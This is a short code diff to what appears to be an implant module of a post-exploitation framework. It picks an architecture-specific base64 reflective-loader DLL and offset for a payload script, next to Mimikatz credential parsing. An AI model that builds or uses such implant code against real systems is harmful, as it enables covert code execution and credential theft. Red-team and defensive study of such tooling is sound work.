@@ -5,6 +5,14 @@ import string
 
 class DotNet2JSJob(core.job.Job):
     def create(self):
+        # cant change this earlier, has to be job specific
+        # i dont like it, but this is how we do this to make payload smaller
+        if self.session.arch == "64":
+            self.script = self.script.replace("~SHIMB64~", self.options.get("SHIMX64B64"))
+            self.script = self.script.replace("~SHIMOFFSET~", self.options.get("SHIMX64OFFSET"))
+        else:
+            self.script = self.script.replace("~SHIMB64~", self.options.get("SHIMX86B64"))
+            self.script = self.script.replace("~SHIMOFFSET~", self.options.get("SHIMX86OFFSET"))
         self.errstat = 0
 
     def parse_mimikatz(self, data):
@@ -78,6 +86,10 @@ class DotNet2JSImplant(core.implant.Implant):
         self.options.register("SHIMX86OFFSET", "6217", "Offset to the reflective loader", advanced = True)
         self.options.register("SHIMX64OFFSET", "7656", "Offset to the reflective loader", advanced = True)
 
+        # self.options.register("SHIMB64", "", "calculated bytes for arr_DLL", advanced = True)
+        # self.options.register("SHIMOFFSET", "", "Offset to the reflective loader", advanced = True)
+
+
     def dllb64(self, path):
         import base64
         with open(path, 'rb') as fileobj:
@@ -104,7 +116,6 @@ class DotNet2JSImplant(core.implant.Implant):
         self.options.set("SHIMX64UUID", uuid.uuid4().hex)
         self.options.set("MIMIX64UUID", uuid.uuid4().hex)
         self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
 
         self.options.set("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")))
         self.options.set("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")))
